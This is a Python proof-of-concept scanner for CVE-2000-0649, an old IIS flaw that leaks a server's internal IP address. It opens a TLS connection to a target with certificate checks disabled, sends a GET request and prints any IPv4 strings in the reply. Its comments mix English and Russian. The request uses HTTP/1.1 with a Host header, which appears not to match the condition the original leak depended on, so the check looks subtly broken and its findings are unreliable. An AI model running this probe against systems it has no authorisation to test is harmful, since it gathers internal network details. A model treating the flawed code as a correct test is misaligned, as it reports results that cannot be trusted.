
#!/usr/bin/env python3
# Written by Rafe Hart (@rafael_hart)
# Updated for Python 3.12+ by M365 Copilot
"""
Test an IP address (port 443) for CVE-2000-0649
Performs an HTTPS GET to the target and searches the response body for IPv4 patterns.
"""

import ssl
import socket
import re
import sys


def make_tls_socket(host: str, port: int, timeout: int = 8) -> socket.socket:
    """
    Create a TCP socket and wrap it with TLS.
    Disables certificate verification (as in original PoC behavior).
    """
    # TCP socket
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(timeout)
    raw.connect((host, port))

    # TLS context (client)
    # Use PROTOCOL_TLS_CLIENT to enable modern defaults; disable verification to match original script intent.
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    # Wrap with SNI (server_hostname=host)
    tls_sock = context.wrap_socket(raw, server_hostname=host)
    return tls_sock


def main():
    if len(sys.argv) == 1:
        print("\nUsage: cve-2000-0649.py <hostname> [path]")
        print("  hostname: <example.com> или <IP>")
        print("  path: абсолютный путь, по умолчанию '/'")
        sys.exit(1)

    target = sys.argv[1]
    path = sys.argv[2] if len(sys.argv) > 2 else "/"

    # Нормализуем путь
    if not path.startswith("/"):
        path = "/" + path

    try:
        s = make_tls_socket(target, 443, timeout=8)

        # Минимально корректный HTTP/1.1 запрос (Host обязателен)
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            "User-Agent: CVE-2000-0649-Check/1.0\r\n"
            "Accept: */*\r\n"
            "Connection: close\r\n"
            "\r\n"
        )
        s.sendall(request.encode("utf-8"))

    except (socket.timeout, OSError, ssl.SSLError) as exc:
        print(f"Didn't work: {exc}")
        sys.exit(1)

    # Читаем ответ блоками и ищем IPv4
    ipv4_pattern = re.compile(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b")
    try:
        buffer = bytearray()
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buffer.extend(chunk)
    finally:
        try:
            s.close()
        except Exception:
            pass

    # Пытаемся декодировать как ISO-8859-1 (HTTP рекомендует этот fallback для заголовков),
    # затем utf-8, чтобы повысить шанс корректной обработки.
    text = None
    for enc in ("iso-8859-1", "utf-8"):
        try:
            text = buffer.decode(enc, errors="replace")
            break
        except Exception:
            continue

    if not text:
        print("Не удалось декодировать ответ сервера.")
        sys.exit(1)

    matches = ipv4_pattern.findall(text)
    if matches:
        # Уберём очевидные приватные/локальные адреса, если нужно
        # (оставим как есть, чтобы поведение соответствовало оригинальному PoC)
        for m in matches:
            print(f"{target} -> {m}")
    else:
        print("IPv4 адреса в ответе не обнаружены.")


if __name__ == "__main__":
    main()
